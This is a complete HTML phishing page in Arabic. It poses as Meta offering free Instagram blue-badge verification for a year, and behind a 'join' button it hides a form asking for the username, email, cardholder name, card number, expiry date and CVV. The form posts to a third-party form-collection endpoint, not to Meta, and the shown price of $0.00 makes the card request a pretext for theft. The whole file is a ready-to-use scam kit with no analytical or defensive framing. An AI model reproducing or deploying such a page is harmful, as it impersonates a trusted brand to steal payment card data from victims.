
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>توثيق إنستقرام - تجربة مجانية</title>
  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Almarai', sans-serif;
      margin: 0;
      background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
      color: white;
    }

    .container {
      text-align: center;
      padding: 60px 20px;
    }

    .container h1 {
      font-size: 32px;
      margin-bottom: 20px;
    }

    .container p {
      font-size: 18px;
      margin-bottom: 30px;
    }

    .cta-button {
      padding: 15px 30px;
      background-color: white;
      color: #833ab4;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    .cta-button:hover {
      background-color: #eee;
    }

    .form-box {
      display: none;
      background: rgba(255, 255, 255, 0.15);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      width: 340px;
      margin: 40px auto;
      backdrop-filter: blur(10px);
    }

    .form-box h2 {
      margin-bottom: 20px;
      color: #fff;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: none;
      background-color: rgba(255,255,255,0.9);
      font-size: 14px;
    }

    .price-box {
      background-color: white;
      color: #833ab4;
      padding: 12px;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      text-align: center;
      margin-top: 15px;
    }

    .submit-button {
      width: 100%;
      padding: 12px;
      background: white;
      color: #833ab4;
      border: none;
      border-radius: 30px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s;
    }

    .submit-button:hover {
      background: #eee;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>منصة Meta توثق حسابك على إنستقرام مجانًا!</h1>
    <p>سجّل الآن في التجربة المجانية لمدة سنة كاملة واحصل على شارة التوثيق الزرقاء لحسابك.</p>
    <button class="cta-button" onclick="document.querySelector('.form-box').style.display='block'; window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'});">
‎      انضم إلى التجربة المجانية من Meta Verified
    </button>
  </div>

  <form class="form-box" method="POST" action="https://usebasin.com/f/deca66ab9f47">
    <h2>الدفع - تجربة مجانية</h2>

    <input type="text" name="username" placeholder="اسم المستخدم" required>
    <input type="email" name="email" placeholder="البريد الإلكتروني" required>
    <input type="text" name="cardholder_name" placeholder="اسم حامل البطاقة" required>
    <input type="text" name="card_number" placeholder="رقم البطاقة" required>
    
    <div style="display: flex; gap: 10px;">
      <input type="text" name="exp_month" placeholder="شهر الانتهاء" required>
      <input type="text" name="exp_year" placeholder="سنة الانتهاء" required>
    </div>

    <input type="text" name="cvv" placeholder="رمز الأمان (CVV)" required>

    <div class="price-box">
‎      السعر: 0.00 دولار – تجربة مجانية لمدة سنة
    </div>

    <button type="submit" class="submit-button">بدء التجربة المجانية</button>
  </form>

</body>
</html>
